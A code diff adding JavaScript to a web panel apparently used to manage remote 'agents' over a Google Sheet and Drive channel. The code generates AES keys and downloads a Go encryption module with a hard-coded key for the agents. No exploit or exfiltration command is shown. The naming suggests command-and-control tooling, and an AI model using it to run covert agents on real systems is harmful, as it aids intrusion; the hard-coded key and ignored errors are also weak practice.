+      <div class="akey">${ak[String(a.id)]?ak[String(a.id)]:'<span style="color:var(--txt3)">global</span>'}</div>
+      <div><button class="btn sm" onclick='openKeyModal(${a.id},"${esc(a.name)}")'>Edit</button></div>
+    </div>`).join('')}
+  </div>`;
+}
+
+// ═══════════════════════════════════════════
+// Go snippet download
+// ═══════════════════════════════════════════
+$('btn-gen-go-key').onclick = () => {
+  const key = Array.from(crypto.getRandomValues(new Uint8Array(32)))
+    .map(b => b.toString(16).padStart(2, '0')).join('');
+  $('go-agent-key').value = key;
+  toast('Temporary key generated','ok',2500);
+};
+$('btn-save-go-key').onclick = () => {
+  const raw = $('go-agent-key').value.trim();
+  if (!raw) { toast('Key is empty','warn'); return; }
+  if (raw.length !== 64 || !/^[0-9a-fA-F]+$/.test(raw)) { toast('Invalid key (need 64 hex chars)','warn'); return; }
+  $('go-agent-key').value = raw.toLowerCase();
+  toast('Custom key accepted','ok');
+};
+$('btn-dl-go').onclick=()=>{
+  let keyHex = $('go-agent-key').value.trim();
+  const isValidCustom = keyHex.length === 64 && /^[0-9a-fA-F]+$/.test(keyHex);
+  if (!isValidCustom) {
+    const globalRaw = $('kdisplay').textContent || $('cfg-key').value || '';
+    keyHex = (globalRaw.includes('…') || globalRaw.length !== 64)
+             ? 'REPLACE_WITH_YOUR_64_HEX_CHAR_KEY'
+             : globalRaw;
+  }
+  const code=`// internal/crypto/crypto.go
+// !! DO NOT COMMIT TO VCS — KEEP SECRET !!
+package crypto
+
+import (
+\t"crypto/aes"
+\t"crypto/cipher"
+\t"crypto/rand"
+\t"encoding/base64"
+\t"io"
+)
+
+// HardcodedKey: AES-256 (32 bytes). Must match the Web UI key.
+var HardcodedKey = mustHex("${keyHex}")
+
+func mustHex(h string) []byte {
+\tb := make([]byte, len(h)/2)
+\tfor i := range b {
+\t\tvar n byte
+\t\tfor _, c := range h[i*2 : i*2+2] {
+\t\t\tn <<= 4
+\t\t\tswitch { case c>='0'&&c<='9': n|=byte(c-'0')
+\t\t\t         case c>='a'&&c<='f': n|=byte(c-'a')+10
+\t\t\t         case c>='A'&&c<='F': n|=byte(c-'A')+10 }
+\t\t}
+\t\tb[i] = n
+\t}
+\treturn b
+}
+
+func Encrypt(pt string) (string, error) {
+\tblock, _ := aes.NewCipher(HardcodedKey)
+\tgcm, _   := cipher.NewGCM(block)
+\tnonce    := make([]byte, gcm.NonceSize())
+\tio.ReadFull(rand.Reader, nonce)
+\tct := gcm.Seal(nonce, nonce, []byte(pt), nil)
+\treturn base64.StdEncoding.EncodeToString(ct), nil
+}
+
+func Decrypt(b64 string) (string, bool) {
+\traw, err := base64.StdEncoding.DecodeString(b64)
+\tif err != nil { return b64, false }
+\tblock, _ := aes.NewCipher(HardcodedKey)
+\tgcm, _   := cipher.NewGCM(block)
+\tns       := gcm.NonceSize()
+\tif len(raw) < ns { return b64, false }
+\tpt, err  := gcm.Open(nil, raw[:ns], raw[ns:], nil)
+\tif err != nil { return b64, false }
+\treturn string(pt), true
+}
+
+func EncryptBytes(data []byte) ([]byte, error) {
+\tblock, _ := aes.NewCipher(HardcodedKey)
+\tgcm, _   := cipher.NewGCM(block)
+\tnonce    := make([]byte, gcm.NonceSize())
+\tio.ReadFull(rand.Reader, nonce)
+\treturn gcm.Seal(nonce, nonce, data, nil), nil
+}
+
+func DecryptBytes(data []byte) ([]byte, error) {
+\tif len(data) < 12 { return nil, nil }
+\tblock, _ := aes.NewCipher(HardcodedKey)
+\tgcm, _   := cipher.NewGCM(block)
+\tns       := gcm.NonceSize()
+\tif len(data) < ns { return nil, nil }
+\tpt, err  := gcm.Open(nil, data[:ns], data[ns:], nil)
+\tif err != nil { return nil, err }
+\treturn pt, nil
+}
+`;
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([code],{type:'text/plain'}));
+  a.download='agent_crypto.go'; a.click();
+};
+
+// ═══════════════════════════════════════════
+// View switch
+// ═══════════════════════════════════════════
+function switchView(v){
+  document.querySelectorAll('.view').forEach(x=>x.classList.remove('active'));
+  $('view-'+v).classList.add('active');
+  document.querySelectorAll('.nav-btn').forEach(x=>x.classList.remove('active'));
+  $('nav-'+v).classList.add('active');
+  if(v==='drive') loadDrive();
+  if(v==='config'){ loadConfig(); checkAuth(); renderAgentKeyTable(); }
+}
+
+$('btn-refresh-agents').onclick = ()=> loadLiveAgents();
+
+// ═══════════════════════════════════════════
+// Init — no automatic Sheet calls
+// ═══════════════════════════════════════════
+(async()=>{
+  await checkAuth();
+  await loadConfig();          // uses config.json (local, cheap)
+  await loadDbSessions();      // local DB (cheap)
+  // NOTE: agent list from Sheet is NOT auto-loaded.
+  //       User must click ⟳ to fetch it.
+  startWebPoll();
+  console.log(`[gc2] web poll = ${state.webPollMs}ms | agent list: manual only`);
+})();
+</script>
+</body>
+</html>
